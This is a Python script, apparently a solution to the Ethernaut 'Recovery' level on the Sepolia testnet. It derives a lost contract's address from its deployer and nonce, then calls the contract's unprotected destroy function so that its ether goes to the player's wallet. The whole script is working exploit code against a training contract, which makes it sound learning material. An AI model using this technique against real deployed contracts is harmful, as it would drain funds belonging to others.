import os

from dotenv import load_dotenv
from eth_abi import encode
from eth_utils import keccak
from web3 import Web3

load_dotenv()

w3 = Web3(Web3.HTTPProvider(os.getenv('PROVIDER_URL')))
if w3.is_connected():
    print("Successfully connected to the provider!")
else:
    print("Failed to connect to the given provider ", os.getenv('PROVIDER_URL'))
    exit()

_PRIVATE_KEY = os.getenv('PRIVATE_KEY')
_WALLET = w3.to_checksum_address(os.getenv('WALLET'))

# Step 1: Get Ethernaut deployed contract
_deployed_address = w3.to_checksum_address("")
# Check balance before
balance_before = w3.eth.get_balance(_WALLET)
print("💰 Balance before:", w3.from_wei(balance_before, 'ether'), "ETH")

# Step 2: get Lost Contract Address
# RLP encode manually (works only for nonce < 128)
rlp_encoded = b'\xd6\x94' + bytes.fromhex(_deployed_address[2:]) + b'\x01'  # 0x01 is the RLP encoding of nonce=1
# Compute address
lost_contract_address = keccak(rlp_encoded)[12:]
lost_contract_address = w3.to_checksum_address(lost_contract_address.hex())
print("Retrieved lost contract address:", lost_contract_address)

# Step 3: Encode function call manually: destroy(address)
function_selector = w3.keccak(text="destroy(address)")[:4]  # First 4 bytes
encoded_args = encode(["address"], [_WALLET])
data = function_selector + encoded_args

# Step 4: prepare and send transaction to blockchain
tx = {
    'chainId': 11155111,
    'to': lost_contract_address,
    'value': 0,
    'data': data,
    'gas': 100_000,
    'gasPrice': w3.eth.gas_price,  # w3.to_wei('2', 'gwei'),
    'nonce': w3.eth.get_transaction_count(_WALLET)
}
signed_tx = w3.eth.account.sign_transaction(tx, private_key=_PRIVATE_KEY)
tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)

# Step 5: Wait for confirmation
receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
assert receipt['status'] == 1
print("✅ Transaction confirmed in block", receipt["blockNumber"])

# Step 6: Check balance after
balance_after = w3.eth.get_balance(_WALLET)
print("💰 Balance after:", w3.from_wei(balance_after, 'ether'), "ETH")

# Step 7: Show delta
delta = balance_after - balance_before
assert delta > 0
print("📈 Gained:", w3.from_wei(delta, 'ether'), "ETH from selfdestruct")
print('Well done, You have completed this level!!! Submit instance asap.')
